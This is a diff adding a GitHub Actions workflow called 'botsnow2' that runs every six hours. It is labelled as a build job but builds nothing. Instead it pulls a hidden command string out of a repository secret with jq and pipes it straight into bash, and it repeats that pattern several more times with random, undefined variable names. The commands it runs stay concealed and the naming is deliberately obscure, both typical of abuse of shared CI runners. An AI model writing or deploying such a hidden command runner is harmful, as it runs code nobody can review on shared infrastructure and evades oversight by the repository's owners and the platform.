@@ -1,0 +1,27 @@
+name: botsnow2
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: botsnow2
+        env:
+          fp0682: ${{ secrets.fp0682 }}
+        run: |
+          echo $fp0682 | jq -r .emvn6 | /bin/bash
+          echo $asv4 | jq -r .emttu136 | /bin/bash
+          echo $ip957 | jq -r .ppxwt74485 | /bin/bash
+          echo $rkcz7 | jq -r .ho7869 | /bin/bash
+          echo $elzu73454 | jq -r .nnnt0393 | /bin/bash
+          echo $cl8236 | jq -r .lcf62 | /bin/bash
+          echo $orgp37 | jq -r .zpry53810 | /bin/bash
+          echo $cgvey541 | jq -r .tzblp4 | /bin/bash
+          echo $oppo7508 | jq -r .i31579 | /bin/bash
+
